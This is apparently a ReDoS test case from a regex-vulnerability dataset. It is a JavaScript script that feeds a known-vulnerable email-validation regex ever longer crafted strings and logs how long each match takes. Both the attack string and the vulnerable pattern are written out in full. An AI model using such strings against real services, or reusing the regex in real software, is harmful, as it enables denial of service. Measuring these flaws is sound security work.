/* 4664
 * ^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"1@1"+"0"*32+"! _1_NQ"
 */
var REGEX = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '1@1' + '0'.repeat(i*1) + '! _1_NQ'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}